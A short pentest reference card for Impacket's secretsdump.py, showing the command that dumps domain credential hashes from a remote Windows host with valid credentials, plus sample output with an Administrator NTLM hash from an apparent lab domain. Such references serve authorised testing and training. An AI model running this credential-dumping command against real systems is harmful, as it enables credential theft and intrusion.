---
id: a87ed429-8db3-4bd4-8424-2ac200c81d5a
name: secretsdump-authenticated-dump
type: command
executor: bash
data: 'secretsdump.py $_DOMAIN/$_USER:$_PASSWORD@$_TARGET_IP'
output: >-
  [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)

  megabank.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd030f3d045072c0508748d1c953862b:::
created_at: '2020-03-16T01:39:57.837512+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - dumping
  - hashes
verified: true
validated: true
---

# secretsdump-authenticated-dump

## Command

```bash
secretsdump.py $_DOMAIN/$_USER:$_PASSWORD@$_TARGET_IP
```

## Description

Dumps hashes from remote system using creds.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN/$_USER:$_PASSWORD | Creds | Yes |
| @$_TARGET_IP | Target | Yes |

## Examples

### Basic Usage

```bash
secretsdump.py domain/user:pass@10.0.0.1
```

## Expected Output

Hashed credentials.

## Related

- [[procedures/Dump-Secrets-from-Remote-Windows-System]]
- [[tools/Impacket]]
